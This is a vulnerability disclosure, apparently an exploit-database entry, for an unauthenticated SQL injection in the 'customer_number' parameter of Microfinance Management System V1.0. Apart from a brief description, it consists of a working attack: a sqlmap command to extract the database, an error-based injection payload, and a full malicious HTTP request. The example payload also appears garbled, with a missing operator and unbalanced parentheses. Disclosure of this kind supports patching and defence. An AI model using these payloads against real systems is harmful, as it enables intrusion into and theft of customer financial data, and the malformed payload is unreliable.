Microfinance Management System V1.0 SQL Injection Vulnerability (Unauthenticated)

----------------------
1. Description:

Microfinance Management System allows SQL Injection via parameter 'customer_number' in
/mims/updatecustomer.php. Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

----------------------
2. Proof of Concept:

In Burpsuite intercept the request from the affected page with
'customer_number' parameter and save it like poc.txt Then run SQLmap to extract the
data from the database:

sqlmap.py -r poc.txt --dbms=mysql

----------------------
3. Example payload:

(error-based)

customer_number=-5361' OR 1 GROUP BY CONCAT(0x716a786271,(SELECT (CASE WHEN (6766=6766) THEN 1 ELSE 0 END)),0x7171716a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'

----------------------
4. Burpsuite request:

GET /mims/updatecustomer.php?customer_number=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1 <br>
Host: localhost<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-us,en;q=0.5<br>
Cache-Control: no-cache <br>
Cookie: PHPSESSID=rf50l831r3vn4ho0g6aef189bt<br>
Referer: http://localhost/mims/managecustomer.php <br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36
